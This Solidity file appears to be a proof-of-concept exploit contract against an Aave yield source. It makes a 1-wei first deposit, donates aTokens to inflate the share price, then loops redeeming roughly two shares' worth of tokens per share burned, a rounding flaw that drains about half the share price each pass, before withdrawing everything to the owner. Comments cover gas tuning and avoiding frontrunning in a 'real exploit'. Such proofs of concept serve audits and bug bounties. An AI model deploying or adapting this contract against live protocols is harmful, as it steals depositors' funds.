// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.10;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { IAaveYieldSource } from "./IAaveYieldSource.sol";


//This contract will handle deposit and transfer (to require that the transfer only goes through if it leads to a very high share price)
//and then handle the actual iteration loop.
contract YieldSourceExploiter   {
    address internal owner;
    IAaveYieldSource internal yieldSource;
    IERC20 internal aToken;
    IERC20 internal usdcToken;

    uint256 constant USDC_DECIMAL = 1e6;

    constructor(address _owner, address _yieldSource, IERC20 _aToken, IERC20 _usdcToken)   {
        owner = _owner;
        yieldSource = IAaveYieldSource(_yieldSource);
        aToken = _aToken;
        usdcToken = _usdcToken;
        _usdcToken.approve(_yieldSource, type(uint256).max);
        _aToken.approve(_yieldSource, type(uint256).max);
    }

    modifier onlyOwner   {
        require(msg.sender == owner);
        _;
    }

    //Before calling this, ensure that the YieldSourceExploiter has been transferred 1 usdcToken and initDeposit aToken.
    function firstDeposit(uint256 initDeposit) external onlyOwner   {
        //Require that there are currently no shares--ensures we don't waste init deposit
        require(yieldSource.totalSupply() == 0);

        //Deposit 1 wei to get 1 share
        yieldSource.supplyTokenTo(1, address(this));

        //Deposit initDeposit to rack up share price
        aToken.transfer(address(yieldSource), initDeposit);
    }

    // Stop price represents price (in USDC * 1e6) where future iterations aren't worth the gas.
    // On optimism each iteration might cost (rough estimate) 50,000 gas at ~3 weth / gas for a total cost / iteration of $0.15. 
    // So a good benchmark is that we should stop when pricePerShare is less than ~$0.50 (half of the price per share is stolen each iteration), 
    // which corresponds to a stopPrice of 0.5 * 1e6 = 500,000.

    // Note that this can continue running until it runs out of gas if fed the wrong parameters. Exploits need good gas efficiency to avoid being frontrun,
    // so I think those parameters would be fed from offchain.
    function iterateExploit(uint256 stopPrice) external onlyOwner   {
        //For numIterations:
        unchecked   {
            while (true)   {
                //Burn 1.99 shares
                uint256 pricePerShare = aToken.balanceOf(address(yieldSource)) / yieldSource.totalSupply();
                uint256 goodRedeemAmount = (pricePerShare * 2) - 1;
                yieldSource.redeemToken(goodRedeemAmount);

                // Make sure we're not about to run out of gas. This works well enough but I think a real exploit would just run the gas calculation off-chain and solely
                // pass in a stopPrice.
                uint256 currentGas = gasleft();
                if (currentGas < 300000 || pricePerShare < stopPrice)   {
                    break;
                }

                // Mint 1 share. We're passing in too many tokens here (due to price change caused by operation above), 
                // but so long as it's not 2x too many (which it's not) it doesn't affect anything.
                yieldSource.supplyTokenTo(pricePerShare, address(this));
            }
        }
    }

    function withdrawFunds() external onlyOwner   {
        //Withdraw all funds
        uint256 aBalance = aToken.balanceOf(address(this));
        if (aBalance != 0)   {
            aToken.transfer(msg.sender, aBalance);
        }

        uint256 usdcBalance = usdcToken.balanceOf(address(this));
        if (usdcBalance != 0)   {
            usdcToken.transfer(msg.sender, usdcBalance);
        }
    }
}